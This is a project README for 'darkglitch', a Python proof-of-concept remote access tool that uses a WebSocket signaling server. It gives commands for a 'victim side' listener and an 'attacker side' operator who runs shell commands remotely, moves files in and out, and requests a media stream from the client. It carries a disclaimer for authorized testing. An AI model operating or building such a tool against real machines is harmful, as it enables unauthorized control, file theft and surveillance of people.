# darkglitch

darkglitch is a small Python proof-of-concept for remote command delivery over a WebSocket signaling channel. It is intended for authorized security testing and educational use.

## What it does

This tool can:

- start a listener that registers a client and waits for commands
- discover online peers on the same signaling room
- run shell commands remotely
- upload and download files
- request a media stream from a connected client

## Requirements

- Python 3.10+
- dependencies from requirements.txt

## Installation

From the project root, create and activate a virtual environment, then install the dependencies:

```bash
python3 -m venv .venv
source .venv/bin/activate
```

install the package:

```bash
pip install darkglitch .
```

## Configuration

Edit core/config.py to point the client to your signaling server and room:

```python
HOST = "https://your-signal-server.example/"
ROOM = "your-room"
```

## Usage

### 1. Start a listener (victim side)

```bash
python darkglitch.py -l -c
```

Use `-l -s` if you want to start a stream-enabled listener.

### 2. List online peers (attacker side)

```bash
python darkglitch.py -ol
```

### 3. Send a remote command

```bash
python darkglitch.py -c <client_id> "whoami"
```

### 4. Request a media stream

```bash
python darkglitch.py -s <client_id>
```

### 5. Upload or download files

```bash
python darkglitch.py -u <client_id> /path/to/local/file /path/to/remote/file
python darkglitch.py -d <client_id> /path/to/remote/file /path/to/local/file
```

### Help and version

```bash
python darkglitch.py -h
python darkglitch.py -v
```

## Notes

This repository is for research and learning only. Do not deploy it against systems or networks without explicit permission.
